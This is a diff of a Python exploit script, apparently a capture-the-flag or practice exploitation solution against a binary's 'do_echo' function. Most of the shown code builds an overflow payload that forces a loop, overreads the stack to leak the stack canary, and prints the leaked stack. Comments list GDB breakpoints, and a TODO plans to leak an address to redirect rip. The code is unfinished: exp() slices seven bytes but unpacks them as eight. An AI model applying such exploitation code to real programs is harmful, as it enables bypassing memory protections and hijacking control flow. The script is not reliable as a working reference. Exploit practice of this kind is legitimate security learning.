@@ -48,28 +48,67 @@ def first_loop_twice():
     input()
 
 def print_canary():
-    pass
+    # b *do_echo+129 to check which loop going into
+    # b *do_echo+151 to check arguments for first read in first loop
+    # b *do_echo+297, then look at RCX to check stack canary 
+    # x/20gx $rbp - 80 to look at activity around the base pointer
+    print("Start Receiving?")
+    input()
+    print(p.recv())
+    payload = b'\xff' #force first loop
+    #payload += b'A' * 8 #Number of bytes to write into buffer first and second time
+    payload += struct.pack('Q', 0x200) #Number of bytes to be written to screen
+    num_padding = 0x11b - len(payload) - 0x12
+    payload += b'C' * (num_padding)
+    print("Send Payload?")
+    input()
+    p.send(payload)
+    received_stack = p.recv()
+    canary_offset = num_padding+14 
+    canary = received_stack[canary_offset: canary_offset+8]
+    print("Canary: 0x{:x}".format(struct.unpack('Q',canary)[0]))
+    #print("Received Stack:")
+    #print(received_stack)
+    print("Send Payload?")
+    input()
+    p.sendline(b'X'*8) #this is the canary
+    print(p.recv())
+    input()
 
 def exp():
     # b *do_echo+129 to check which loop going into
     # b *do_echo+151 to check arguments for first read in first loop
     # b *do_echo+297, then look at RCX to check stack canary 
     # x/20gx $rbp - 80 to look at activity around the base pointer
+    print("Start Receiving?")
     input()
     print(p.recv())
     payload = b'\xff' #force first loop
-    payload += b'A' * 8 #Number of bytes to write into buffer first and second time
-    payload += b'C' * (0x11b - len(payload) - 0x11)
+    #payload += b'A' * 8 #Number of bytes to write into buffer first and second time
+    payload += struct.pack('Q', 0x200) #Number of bytes to be written to screen
+    num_padding = 0x11b - len(payload) - 0x12
+    payload += b'C' * (num_padding)
+    print("Send Payload?")
+    input()
     p.send(payload)
-    print(p.recv())
+    received_stack = p.recv()
+    canary_offset = num_padding+14 
+    canary = received_stack[canary_offset: canary_offset+7]
+    print("Canary: 0x{:x}".format(struct.unpack('Q',canary)[0]))
+    print("Received Stack:")
+    print(received_stack)
+    print("Send Payload?")
+    input()
     p.sendline(b'X'*8) #this is the canary
     print(p.recv())
-    p.sendline(b'Y'*8) #this is the canary
-    print(p.recv())
     input()
+
+
+#TODO: Leak address to redirect rip
 
 if __name__=='__main__':
     #stack_smashing()
     #stack_smashing2()
+    print_canary()
     exp()
 
